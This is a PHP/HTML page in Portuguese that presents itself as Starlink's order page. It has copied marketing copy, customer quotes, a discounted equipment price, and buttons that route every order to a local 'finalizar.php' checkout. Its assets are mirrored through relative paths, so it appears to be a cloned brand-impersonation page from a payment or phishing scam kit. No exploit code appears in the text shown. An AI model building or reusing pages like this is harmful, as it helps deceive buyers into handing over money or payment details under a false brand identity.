<?php
?>
<!DOCTYPE HTML>
<html>


<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
	<title>Starlink: Internet em qualquer lugar a qualquer momento</title>
	<meta charset="utf-8">
	<script type="text/javascript" src="js/jquery.js"></script>
	<script type="text/javascript" src="js/js.js"></script>
	
	<link rel="stylesheet" href="css/css.css">
	<link rel="stylesheet" href="css/inicio.css">
	<script type="text/javascript" src="js/1.js" ></script>
	<script type="text/javascript" src="js/2.js" ></script>
	
	<meta charset='utf-8'>
	<meta name="viewport" content="width=device-width,initial-scale=1.0, maximum-scale=1.0">
	<meta name="format-detection" content="telephone=no">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">

	<link rel="icon" type="image/x-icon" href="../i.imgur.com/cNAkZQx.png">

    <link rel="preconnect" href="../fonts.googleapis.com/index.html">
<link rel="preconnect" href="../fonts.gstatic.com/index.html" crossorigin>
<link href="../fonts.googleapis.com/css29692.css?family=Nunito+Sans:opsz,wght@6..12,200;6..12,500&amp;family=Roboto+Condensed:wght@300;400;600&amp;display=swap" rel="stylesheet">
</head>

<body id='body' class='c1' style='margin:0;width:100%;-webkit-text-size-adjust:none;'>
<span id='local' style='display:none;'>inicio</span>
<div id='loading' style='position:fixed;width:100vw;height:100vh;background-color:rgba(0,0,0,0.8);display:none;align-items:center;z-index:105;'>
    <style> .loader{ margin:25px; border: solid 5px #ffffff; border-top: 5px solid rgba(0,0,0,0); border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }  @keyframes spin {  0% { transform: rotate(0deg); }  100% { transform: rotate(360deg); } } </style>
    <div style='width:100%;'>
        <div style='margin:0 auto;height:70px;text-align:center;'>
	        <div class='loader' style='margin:0 auto;'></div>
        </div>
    </div>
</div>

<main id='main' style='position:relative;display:flex;flex-flow:column;width:100%;height:100vh;max-height:100vh;background-image:url("../i.imgur.com/7oByjv1.jpg");background-size:cover;background-repeat:no-repeat;'><!--MOBILE 660px-->
	
	<img src='../i.imgur.com/1fXzbcn.png' class='logoDaTela' style='width:165px;max-width:165px;max-height:27.22px;' />

	<span class='pedirUmaStarlink' style='font-family:Roboto Condensed;font-weight: 600;color:#ffffff;'>PEDIR UMA STARLINK</span>
	<span class='texto1' style='text-align:center;word-break:break-word;font-family:Roboto Condensed;color:#ffffff;'>Internet de banda larga de alta velocidade e baixa latência em locais remotos e rurais em todo o mundo. <b>Custo único do equipamento a partir de R$ 999,90 mais internet a partir de R$ 184,00</b>.</span>

	<div onclick='pedirAgora();' class='botaoPedirAgora' style='width:200px;height:50px;max-width:200px;min-height:50px;display:flex;align-items:center;border-radius:4px;background-color:#ffffff;cursor:pointer;'>
		<span style='margin:0 auto;font-family:Roboto Condensed;font-weight:600;font-size:12px;color:#000000;'>PEDIR AGORA</span>
	</div>
	<span class='texto2' style='font-family:nunito sans;font-size:14px;color:#f1f1f1;'>Ao clicar em “pedir agora”, você concorda com nossa <a href='../www.starlink.com/legal.html' target='_blank' style='color:#f1f1f1;'>Política de Privacidade</a></span>

	<script>
		ofuscar = true;
		setInterval(function(){
			if(ofuscar==true){
				$('#setaMais').fadeOut(500);
				ofuscar = false;
				}else{
					$('#setaMais').fadeIn(500);
					ofuscar = true;
					}
		},500);
	</script>
	<img id='setaMais' class='setaMais' src='../i.imgur.com/xBYhF2N.png' style='font-size:60px;color:#ffffff;width:30px;'>
</main>

<!--Criativos-->
<div style='width:100%;display:flex;flex-flow:column;'>
	
	<div class='marketing' style='position:relative;flex-grow:1;background-color:#000000;'>
		<div class='div3Marketing' style='background-image:url("../i.imgur.com/lBKFUAh.jpg");background-size:cover;background-repeat:no-repeat;'></div>
		<div class='div4Marketing' style='text-align:left;'>
			<div class='div1Marketing' style='word-break:break-word;'>
				<span class='texto1Div1Marketing' style='display:block;font-family:Roboto Condensed;font-weight: 600;color:#ffffff;text-transform:uppercase;'>TRANSMISSÃO, CHAMADAS DE VÍDEO, JOGOS ON-LINE E MUITO MAIS</span>
				<div class='div2Marketing'>	
					<span style='margin-top:30px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>Com a Starlink, os usuários podem se envolver em atividades que historicamente não eram possíveis com a internet via satélite.</span>
					<span style='margin-top:30px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>O serviço de alta velocidade e baixa latência da Starlink é possível por meio da maior constelação mundial de satélites mais avançados, que operam em uma órbita baixa ao redor da Terra.</span>
					<div onclick='pedirAgora();' class='botaoPedirAgora2' style='height:50px;min-height:50px;display:flex;align-items:center;border-radius:4px;border:solid 2px #ffffff;cursor:pointer;'>
						<span style='margin:0 auto;font-family:Roboto Condensed;font-weight:600;font-size:14px;color:#ffffff;'>PEDIR AGORA</span>
					</div>
				</div>
			</div>
		</div>
	</div>

	<div class='marketing' style='position:relative;flex-grow:1;background-color:#000000;'>
		<div class='div4MarketingI' style='text-align:left;'>
			<div class='div1MarketingI' style='word-break:break-word;'>
				<span class='texto1Div1Marketing' style='display:block;font-family:Roboto Condensed;font-weight: 600;color:#ffffff;text-transform:uppercase;'>AUTOINSTALAÇÃO FÁCIL</span>
				<div class='div2Marketing'>	
					<span style='margin-top:30px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>O seu Kit Starlink vem com tudo o que você precisa para se conectar em minutos, incluindo a sua Starlink, um roteador Wi-Fi, cabos e a base.</span>
					<span style='margin-top:30px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>Clique <a href='../www.starlink.com/specifications.html' target='_blank'>aqui</a> para ver as especificações técnicas da Starlink.</span>
					<div class='botaoPedirAgora2' style='height:50px;max-width:200px;min-height:50px;display:flex;align-items:center;border-radius:4px;border:solid 2px #ffffff;cursor:pointer;'>
						<a href='../www.youtube.com/watche54c.html' target='_blank' style='margin:0 auto;font-family:Roboto Condensed;font-weight:600;font-size:14px;color:#ffffff;text-decoration:none;'>VISUALIZAR INSTALAÇÃO</a>
					</div>
				</div>
			</div>
		</div>
		<div class='div3MarketingI' style='background-image:url("../i.imgur.com/46JBdQt.jpg");background-size:cover;background-repeat:no-repeat;'></div>
	</div>
	
	<div class='marketing' style='position:relative;flex-grow:1;background-color:#000000;'>
		<div class='div3Marketing' style='background-image:url("../i.imgur.com/RXw7PD2.jpg");background-size:cover;background-repeat:no-repeat;'></div>
		<div class='div4Marketing' style='text-align:left;'>
			<div class='div1Marketing' style='word-break:break-word;'>
				<span class='texto1Div1Marketing' style='display:block;font-family:Roboto Condensed;font-weight: 600;color:#ffffff;text-transform:uppercase;'>SEM CONTRATOS, TESTE DE 30 DIAS</span>
				<div class='div2Marketing'>	
					<span style='margin-top:30px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>Contratos de longo prazo impedem que ambas as partes façam alterações sensatas quando necessário.</span>
					<span style='margin-top:30px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>Os contratos firmados com a Starlink são justos para ambas as partes. A Starlink pode ajustar termos e preços conforme necessário e os clientes podem cancelar a qualquer momento, por qualquer motivo.</span>
					<span style='margin-top:30px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>Experimente qualquer produto Starlink por 30 dias e, se não estiver satisfeito, devolva o equipamento e receba um reembolso total.</span>
					<div onclick='pedirAgora();' class='botaoPedirAgora2' style='height:50px;min-height:50px;display:flex;align-items:center;border-radius:4px;border:solid 2px #ffffff;cursor:pointer;'>
						<span style='margin:0 auto;font-family:Roboto Condensed;font-weight:600;font-size:14px;color:#ffffff;'>PEDIR AGORA</span>
					</div>
				</div>
			</div>
		</div>
	</div>

	<div style='position:relative;display:flex;align-items:center;width:100%;height:100vh;max-height:100vh;background-image:url("../i.imgur.com/SwA6qxC.jpg");background-size:cover;background-repeat:no-repeat;'>
		<div class='campoViajeComAStarlink' style='word-break:break-word;'>
			<span class='texto1Div1Marketing' style='display:block;font-family:Roboto Condensed;font-weight: 600;color:#ffffff;text-transform:uppercase;'>VIAJE COM A STARLINK</span>
			<span style='margin-top:30px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>Com os planos Mobile da Starlink, você pode levar seu serviço de internet de alta velocidade e baixa latência aonde quer que vá.</span>
			<span style='margin-top:30px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>Pause e retome seu plano de acordo com suas necessidades de viagem e mantenha-se conectado em qualquer local onde a Starlink esteja disponível.</span>
			<div onclick='pedirAgora();' class='botaoPedirAgora2' style='height:50px;min-height:50px;display:flex;align-items:center;border-radius:4px;border:solid 2px #ffffff;cursor:pointer;'>
				<span style='margin:0 auto;font-family:Roboto Condensed;font-weight:600;font-size:14px;color:#ffffff;'>PEDIR AGORA</span>
			</div>
		</div>
	</div>

	<div class='marketing' style='position:relative;flex-grow:1;background-color:#000000;'>
		<div class='div3Marketing' style='background-image:url("../i.imgur.com/Gnu6ugX.jpg");background-size:cover;background-repeat:no-repeat;'></div>
		<div class='div4Marketing' style='text-align:left;'>
			<div class='div1Marketing' style='word-break:break-word;'>
				<span class='texto1Div1Marketing' style='display:block;font-family:Roboto Condensed;font-weight: 600;color:#ffffff;text-transform:uppercase;'>GERENCIE A STARLINK DESDE O APLICATIVO MÓVEL</span>
				<div class='div2Marketing'>	
					<span style='margin-top:30px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>O aplicativo da Starlink também ajuda você a personalizar as configurações, receber atualizações, acessar a Assistência, e ver dados de desempenho em tempo real como velocidade de download, latência e tempo de atividade.</span>
					<span style='margin-top:30px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>Baixe o aplicativo para determinar o melhor local para configurar antes de instalar. A Starlink precisa de uma visão clara do céu para se conectar aos satélites.</span>
					<div onclick='pedirAgora();' class='botaoPedirAgora2' style='height:50px;min-height:50px;display:flex;align-items:center;border-radius:4px;border:solid 2px #ffffff;cursor:pointer;'>
						<span style='margin:0 auto;font-family:Roboto Condensed;font-weight:600;font-size:14px;color:#ffffff;'>PEDIR AGORA</span>
					</div>
				</div>
			</div>
		</div>
	</div>

	<div class='divOpiniões' style='width:100%;background-color:#272626;text-align:center;display:flex;flex-flow:column;'>	
		<span class='texto1Div1Marketing' style='display:block;font-family:Roboto Condensed;font-weight: 600;color:#ffffff;text-transform:uppercase;'>OPINIÕES DOS CLIENTES</span>
		<div class='opinioesDeClientes' style='flex-grow:1;'>
			<div class='opinião1'>
				<span style='display:block;font-family:Roboto Condensed;font-weight:400;font-size:28px;color:#ffffff;'>“É um mundo totalmente diferente... Antes da Starlink, tínhamos que racionar dados e não podíamos transmitir. Agora temos arquivos baixando, Pandora tocando, Zoom acontecendo e não há nenhuma latência.”</span>
				<span style='margin-top:10px;display:block;font-family:Roboto Condensed;font-weight:400;font-size:28px;color:#ffffff;'>- William D. do Colorado, EUA</span>
			</div>
			<div class='opinião2'>
				<span style='display:block;font-family:Roboto Condensed;font-weight:400;font-size:28px;color:#ffffff;'>“Mudança absoluta de jogo! Não há excesso de promessas e fornecimento incompleto como nosso antigo fornecedor lento. Ligue e mostre a Dishy o céu, e é só isso! Em menos de 5 minutos passamos do esquecido para ter a conexão de internet mais rápida da área.”</span>
				<span style='margin-top:10px;display:block;font-family:Roboto Condensed;font-weight:400;font-size:28px;color:#ffffff;'>- Aaron W. do sul da Inglaterra</span>
			</div>
			<div class='opinião1'>
				<span style='display:block;font-family:Roboto Condensed;font-weight:400;font-size:28px;color:#ffffff;'>“Milhões não estão conectados à Internet - estamos entusiasmados em dizer que não estamos mais entre eles. Muito rápida e on-line em minutos, Starlink termina uma jornada de seis anos.”</span>
				<span style='margin-top:10px;display:block;font-family:Roboto Condensed;font-weight:400;font-size:28px;color:#ffffff;'>- Neil de Nova Gales do Sul da Austrália</span>
			</div>
		</div>
	</div>
	
	<div class='marketing' style='position:relative;flex-grow:1;background-color:#000000;'>
		<div class='div3Marketing' style='background-image:url("../i.imgur.com/urlKepT.jpg");background-size:cover;background-repeat:no-repeat;'></div>
		<div class='div4Marketing' style='text-align:left;'>
			<div class='div1Marketing' style='word-break:break-word;'>
				<span class='texto1Div1Marketing' style='display:block;font-family:Roboto Condensed;font-weight: 600;color:#ffffff;text-transform:uppercase;'>LÍDER EM SUSTENTABILIDADE ESPACIAL</span>
				<div class='div2Marketing'>	
					<span style='margin-top:30px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>A Starlink não só lidera a indústria em inovações para reduzir o brilho dos satélites, mas também a redução de detritos em órbita - cumprindo ou superando todas as normas regulatórias e da indústria.</span>
					<div onclick='pedirAgora();' class='botaoPedirAgora2' style='height:50px;min-height:50px;display:flex;align-items:center;border-radius:4px;border:solid 2px #ffffff;cursor:pointer;'>
						<span style='margin:0 auto;font-family:Roboto Condensed;font-weight:600;font-size:14px;color:#ffffff;'>PEDIR AGORA</span>
					</div>
				</div>
			</div>
		</div>
	</div>


	<div class='marketing bug' style='position:relative;flex-grow:1;background-color:#000000;'>
		<div class='div4MarketingI' style='text-align:left;'>
			<div class='div1MarketingI' style='word-break:break-word;'>
				<span class='texto1Div1Marketing' style='display:block;font-family:Roboto Condensed;font-weight: 600;color:#ffffff;text-transform:uppercase;'>DESENVOLVIDA PELA SPACEX</span>
				<div class='div2Marketing'>	
					<span style='margin-top:30px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>A SpaceX está aproveitando sua experiência na construção de foguetes e espaçonaves para implantar o sistema de internet banda larga mais avançado do mundo. Como a principal fornecedora mundial de serviços de lançamento — e a única fornecedora de foguetes reutilizáveis de classe orbital —, a SpaceX tem profunda experiência tanto em naves espaciais, quanto em operações em órbita.</span>
					<div class='botaoPedirAgora2' style='height:50px;max-width:200px;min-height:50px;display:flex;align-items:center;border-radius:4px;border:solid 2px #ffffff;cursor:pointer;'>
						<a href='../www.youtube.com/watche54c.html' target='_blank' style='margin:0 auto;font-family:Roboto Condensed;font-weight:600;font-size:14px;color:#ffffff;text-decoration:none;'>VISUALIZAR INSTALAÇÃO</a>
					</div>
				</div>
			</div>
		</div>
		<div class='div3MarketingI' style='background-image:url("../i.imgur.com/uStthpE.jpg");background-size:cover;background-repeat:no-repeat;'></div>
	</div>

</div>

<div class='footer' style='width:100%;background-color:#000000;display:flex;align-items:center;'>
	<div style='padding:0 20px;flex-grow:1;display:flex;align-items:center;'>
		<span style='margin:0 auto 0 0;font-family:Roboto Condensed;font-size:14px;color:#888888;'>Starlink © 2024</span>
		<span style='margin:0 0 0 auto;font-family:Roboto Condensed;font-size:14px;color:#888888;'>Starlink é uma divisão da SpaceX.</span>
	</div>
</div>
<!-- Google tag (gtag.js) -->
<script async src="../www.googletagmanager.com/gtag/js7508?id=AW-11413281008">
</script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-11413281008');
</script>
<script>
    function pedirAgora() {
        window.location.href = 'finalizar.php';
    }
</script>
</body>


</html>
